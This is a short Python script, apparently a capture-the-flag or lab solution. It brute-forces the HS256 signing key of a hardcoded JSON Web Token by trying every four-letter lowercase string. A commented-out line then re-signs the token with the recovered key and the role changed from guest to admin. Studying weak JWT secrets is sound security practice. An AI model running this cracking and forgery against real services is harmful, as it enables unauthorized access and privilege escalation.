#!C:\Python3.7
# -*- coding:utf-8 -*-
import jwt
import string
import itertools
 
 
def test_HS256():
    key = "test"
    encoded = jwt.encode({"some":"payload"},key,algorithm="HS256")
    print(encoded)
 
    try:
        # print(jwt.decode(encoded,"test",algorithms="HS256"))
        print(jwt.decode(encoded, "tes", algorithms="HS256"))
    except Exception as e:
        print(e)
        print("error")
        exit()
 
def brute_HS256(encode):
    keys=string.ascii_lowercase
    # print(keys)
    for i in itertools.product(keys,repeat=4):
        key = "".join(i)
        print("[--]test ",key)
        try:
            print("[****]key:",key,jwt.decode(encode,key,algorithms="HS256"))
            break
        except Exception as e:
            pass
        # print(key)
 
 
if __name__ == '__main__':
    # test_HS256()
    encode="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJwYXNzd29yZCIsInJvbGUiOiJndWVzdCJ9.xCCx-8iRz4HybhQ5iz3zHLniJ5koa7iflMALlaos6ic"
    brute_HS256(encode)
    # print(jwt.encode({'username': 'admin', 'password': 'password', 'role': 'admin'},"hqpf",algorithm="HS256"))
